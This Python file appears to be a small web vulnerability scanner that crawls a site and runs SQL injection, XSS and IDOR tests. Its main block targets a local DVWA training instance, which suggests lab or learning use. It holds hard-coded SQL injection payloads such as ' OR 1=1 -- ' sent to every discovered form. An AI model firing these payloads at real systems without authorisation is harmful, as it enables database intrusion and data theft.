import requests
from main.service.crawler import WebCrawler
from main.tests.sql_injection import SQLInjector
from main.tests.xss import AdvancedXSSInjector
from main.tests.idor import IDORTester


class Scanner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")


        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0"
        })

        self.crawler = WebCrawler(self.base_url, session=self.session)


        self.sql_injector = SQLInjector(session=self.session)
        self.xss_injector = AdvancedXSSInjector(session=self.session)
        self.idor_tester = IDORTester(session=self.session)


    def run_targeted_scan(self, url):
        
        surface = self.crawler.scan(url)

        if not surface:
            print("[!] No surface found, using fallback.")
            surface = [{"url": url, "forms": []}]

        print(f"[DEBUG] Surface: {surface}")

        results = {}

        if "sqli" in url:
            results["sql_injection"] = self._test_sql_logic(surface)

        elif "xss" in url:
            forms = [f for p in surface for f in p.get("forms", [])]
            results["xss"] = self.xss_injector.scan_all_xss(url, forms)

        elif "idor" in url or "open_redirect" in url:
            results["idor"] = self.idor_tester.scan_for_idor(url, surface)

        else:
            print("[*] Running full discovery scan...")
            results["discovery"] = self.crawler.run()

        return results



    def _test_sql_logic(self, surface):
        findings = []

        payloads = [
            "' OR 1=1 -- ",
            "' OR '1'='1' -- ",
            "' OR 1=1 #"
        ]

        for page in surface:
            for form in page.get("forms", []):
                for payload in payloads:
                    try:
                        res = self.sql_injector.send_payload(form, payload)

                        findings.append({
                            "url": page["url"],
                            "action": form.get("action"),
                            "payload": payload,
                            "result": res
                        })
                    except Exception as e:
                        findings.append({
                            "url": page["url"],
                            "error": str(e)
                        })

        return findings



if __name__ == "__main__":
    BASE = "http://localhost/DVWA"   
    TARGET = f"{BASE}/vulnerabilities/sqli/"

    scanner = Scanner(BASE)
    report = scanner.run_targeted_scan(TARGET)
